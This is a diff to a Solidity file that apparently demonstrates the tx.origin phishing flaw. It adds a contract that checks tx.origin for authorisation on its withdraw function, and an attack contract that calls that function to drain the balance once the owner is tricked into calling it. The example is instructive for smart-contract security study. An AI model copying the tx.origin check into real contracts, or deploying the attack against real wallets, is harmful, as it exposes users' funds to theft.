@@ -1,24 +1,33 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.17;
-// phishing with tx.origin
+pragma solidity ^0.8.23;
 
-contract txorigin_wallet{
+contract VulnerableContract {
     address public owner;
 
-    constructor(){
-         owner = msg.sender;
+    constructor() {
+        owner = msg.sender;
     }
 
-    function deposit() public payable{
+    function withdraw() public {
+        require(tx.origin == owner, "Not authorized");
+        payable(msg.sender).transfer(address(this).balance);
     }
 
-    function transfer(address payable to, uint amt) public{
-         require(tx.origin == owner, "Not the owner");
-         (bool sent, ) = to.call{value: amt}("");
-        require(sent, "failed to send ether");
+    receive() external payable {}
+}
+
+contract AttackContract {
+    address public vulnerableContract;
+
+    constructor(address _vulnerableContract) {
+        vulnerableContract = _vulnerableContract;
     }
 
-    function getBalance() public view returns (uint){
-        return address(this).balance;
+    function attack() public {
+        (bool success,) = vulnerableContract.call(abi.encodeWithSignature("withdraw()"));
+        require(success, "Attack failed");
     }
+
+    // Function to receive Ether
+    receive() external payable {}
 }
